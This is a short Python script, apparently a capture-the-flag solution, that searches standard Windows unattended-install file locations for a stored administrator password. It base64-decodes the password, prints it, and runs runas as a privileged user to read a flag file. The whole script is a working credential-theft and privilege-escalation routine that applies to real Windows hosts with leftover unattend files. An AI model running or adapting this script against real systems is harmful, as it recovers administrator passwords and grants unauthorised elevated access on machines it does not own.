#!/usr/bin/env python3
"""
Module to extract sensitive data from unattended files.
"""

import os
import re
import base64


def main():
    """
    Main function to scan files, extract password, decode it,
    and output the runas command.
    """
    paths = [
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\autounattend.xml",
        r"C:\Unattend.xml",
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\unattend.xml",
        "sysprep.inf",
        "autounattend.xml",
        "Unattend.xml"
    ]

    pwd_b64 = None
    for path in paths:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                pattern = r'<AdministratorPassword>.*?<Value>(.*?)</Value>'
                match = re.search(pattern, content,
                                  re.IGNORECASE | re.DOTALL)
                if match:
                    pwd_b64 = match.group(1).strip()
                    break

                pattern2 = r'<Password>.*?<Value>(.*?)</Value>'
                match2 = re.search(pattern2, content,
                                   re.IGNORECASE | re.DOTALL)
                if match2:
                    pwd_b64 = match2.group(1).strip()
                    break

    if pwd_b64:
        decoded_bytes = base64.b64decode(pwd_b64)
        try:
            password = decoded_bytes.decode('utf-8')
        except UnicodeDecodeError:
            password = decoded_bytes.decode('utf-16-le')

        if password.endswith('AdministratorPassword'):
            password = password[:-21]

        print(password)
        cmd = (
            "runas /user:SuperAdministrator "
            '"cmd.exe /c type C:\\Users\\SuperAdministrator\\Desktop\\flag.txt"'
        )
        os.system(cmd)


if __name__ == "__main__":
    main()